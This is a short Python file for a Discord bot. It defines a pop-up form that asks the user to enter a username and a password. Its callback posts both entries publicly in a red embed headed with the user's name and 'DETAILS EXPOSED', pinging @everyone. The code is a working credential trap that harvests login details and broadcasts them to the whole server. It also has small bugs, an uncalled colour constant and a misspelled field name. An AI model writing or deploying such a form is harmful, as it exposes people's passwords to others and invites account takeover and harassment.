import discord
from discord.interactions import Interaction
from discord.ui.input_text import InputText

class Personal(discord.ui.Modal):
    def __init__(self, *children: InputText, title: str, custom_id: str | None = None, timeout: float | None = None) -> None:
        super().__init__(*children, title=title, custom_id=custom_id, timeout=timeout)
        self.add_item(discord.ui.InputText(label="username", style=discord.InputTextStyle.short))
        self.add_item(discord.ui.InputText(label="password", style=discord.InputTextStyle.short))

    async def callback(self, interaction: Interaction):
        embed = discord.Embed(color=discord.Colour.red, title=f"{interaction.user.name}'S DETAILS EXPOSED")
        embed.add_field(name="usename",value=self.children[0].value)
        embed.add_field(name="password",value=self.children[1].value)
        await interaction.respond("@everyone",embed=embed)